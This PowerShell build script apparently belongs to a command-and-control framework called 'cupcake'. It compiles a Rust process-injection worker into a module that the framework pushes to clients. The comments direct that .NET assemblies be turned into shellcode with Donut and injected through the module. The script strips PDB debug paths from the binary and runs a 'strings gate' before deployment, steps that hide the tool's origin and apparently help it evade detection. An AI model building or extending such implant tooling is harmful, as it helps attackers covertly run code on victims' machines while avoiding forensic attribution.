# Build L2 inject sacrificial worker -> storage/modules/inject.bin
#
# Architecture v2: inject = standalone short-lived worker EXE (process
# isolation). .NET assemblies are retired: convert them to shellcode
# (e.g. Donut) and inject through this module.
#
# Post-processing: strips RSDS/PDB debug-directory residue (pe-strip-debug.py),
# then runs the strings gate.
#
# Usage:
#   powershell -File scripts/build-inject-module.ps1

$ErrorActionPreference = "Stop"
$ServerRoot = Split-Path -Parent $PSScriptRoot
$RepoRoot   = Split-Path -Parent $ServerRoot
$ClientRoot = Join-Path $RepoRoot "Client"
$OutDir     = Join-Path $ServerRoot "storage\modules"
$ExeName    = "cupcake-inject-worker.exe"
$StripPy    = Join-Path $PSScriptRoot "pe-strip-debug.py"
$Gate       = Join-Path $ClientRoot "scripts\strings-gate.ps1"

if (-not (Test-Path $ClientRoot)) {
    throw "Client tree not found: $ClientRoot"
}

Write-Host "[*] cargo build -p cupcake-inject-worker --release"
Push-Location $ClientRoot
try {
    cargo build -p cupcake-inject-worker --release
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
} finally {
    Pop-Location
}

$src = Join-Path $ClientRoot "target\release\$ExeName"
if (-not (Test-Path $src)) {
    throw "built EXE not found: $src"
}

New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$dst = Join-Path $OutDir "inject.bin"
Copy-Item -Force $src $dst

Write-Host "[*] stripping PE debug directory (RSDS/PDB path residue)"
python $StripPy $dst
if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

Write-Host "[+] Installed $dst ($((Get-Item $dst).Length) bytes)"
Write-Host "    Push via Modules UI or auto on module_required:inject"

if (Test-Path $Gate) {
    & $Gate -Path $dst
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
}
